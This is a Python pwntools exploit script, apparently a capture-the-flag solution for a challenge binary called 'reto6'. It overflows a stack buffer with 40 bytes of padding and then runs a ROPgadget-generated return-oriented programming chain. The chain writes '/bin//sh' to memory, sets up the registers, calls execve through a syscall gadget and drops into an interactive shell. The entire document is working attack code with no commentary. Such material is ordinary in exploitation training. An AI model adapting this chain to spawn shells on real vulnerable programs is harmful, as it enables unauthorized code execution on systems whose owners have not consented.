#!/usr/bin/env python3
from pwn import *

context.terminal = ["x-terminal-emulator", "-e"]
context.arch = "amd64"
p = process("./reto6")

attach(p, "break *0x0000000000401c54\ncontinue")
payload = b"A"*40

# autogenerated by ROPgadget
payload += p64(0x0000000000409f0e) # pop rsi ; ret
payload += p64(0x00000000004c50e0) # @ .data
payload += p64(0x0000000000447ee7) # pop rax ; ret
payload += b'/bin//sh'
payload += p64(0x000000000044a365) # mov qword ptr [rsi], rax ; ret
payload += p64(0x0000000000409f0e) # pop rsi ; ret
payload += p64(0x00000000004c50e8) # @ .data + 8
payload += p64(0x000000000043d0d0) # xor rax, rax ; ret
payload += p64(0x000000000044a365) # mov qword ptr [rsi], rax ; ret
payload += p64(0x0000000000401e9f) # pop rdi ; ret
payload += p64(0x00000000004c50e0) # @ .data
payload += p64(0x0000000000409f0e) # pop rsi ; ret
payload += p64(0x00000000004c50e8) # @ .data + 8
payload += p64(0x000000000047f06b) # pop rdx ; pop rbx ; ret
payload += p64(0x00000000004c50e8) # @ .data + 8
payload += p64(0x4141414141414141) # padding
payload += p64(0x000000000043d0d0) # xor rax, rax ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x00000000004710d0) # add rax, 1 ; ret
payload += p64(0x0000000000401c54) # syscall



p.sendline(payload)

p.interactive()
